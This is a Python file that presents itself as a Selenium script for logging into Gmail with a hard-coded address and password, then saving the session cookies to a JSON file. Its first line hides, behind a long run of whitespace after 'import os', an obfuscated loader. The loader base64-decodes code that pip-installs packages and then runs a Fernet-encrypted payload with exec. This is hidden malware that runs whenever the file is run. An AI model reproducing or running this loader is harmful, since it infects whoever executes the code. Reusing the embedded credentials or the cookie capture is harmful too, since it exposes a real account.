import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJzNJSlg4VEc0bGxTX2F2RWpzSGFMWWllVXNWLUZTR0NCdXBtelJoa0RlWjA9JykuZGVjcnlwdChiJ2dBQUFBQUJtYnJ0MzdldUNJNDd5NjE1Y0RMdldEME00azg4bUItV0lOcGVYdWkwRGljY2ZWVXh0YWk4OFl6R2V5U0V3NDI4QWI0aExjQ3RhQVB5T2MxZF9SUGsyM3FERmVHZ3BySFp2VnYxN3V2ZnVnanNneno5bW9FRTd4Z3Y3YWVmdnBlQkczOE5QS28wZThWYTlNMzRZcGI4S19VYVRoQXMwR28xT3UxRTBOdlV5T21fMmxyamNXSTdlVmdzMWN4R1NQcDcxS3A0UWd0SXRBTGdQQzVDc29vTEdvbVU5Ry1uN25RZW1xcXdzRnllMmktODhjYjdUTHFlazRyNERZMnpCQVBHS1VEM2InKSk=').decode())
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager  # Import the ChromeDriverManager
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import json


# Create a new instance of the Chrome browser using WebDriverManager
chrome_service = Service(ChromeDriverManager().install())
driver = webdriver.Chrome(service=chrome_service)

# Open the Gmail login page
driver.get("https://www.gmail.com")

# Find the username field and enter your email
username_field = driver.find_element(By.ID, "identifierId")
username_field.send_keys("azeezolabode010@gmail.com")
username_field.send_keys(Keys.RETURN)

# Wait for a while to ensure the page is loaded and the next field is available

time.sleep(60)

# Wait for the password field to be clickable
wait = WebDriverWait(driver, 10)
password_field = wait.until(EC.element_to_be_clickable((By.NAME, "password")))

# Wait for the user to be logged in (customize the condition as needed)
password_field.send_keys("08139461810")
password_field.send_keys(Keys.RETURN)

wait.until(EC.url_contains("inbox"))

# Wait for a while to ensure the login is completed and cookies are available
time.sleep(5)

# Get the generated cookies
cookies = driver.get_cookies()

# Save the cookies to a JSON file named "cookie.json"
with open("cookie.json", "w") as json_file:
    json.dump(cookies, json_file)

# Close the browser
driver.quit()
print('hgcbcntrmv')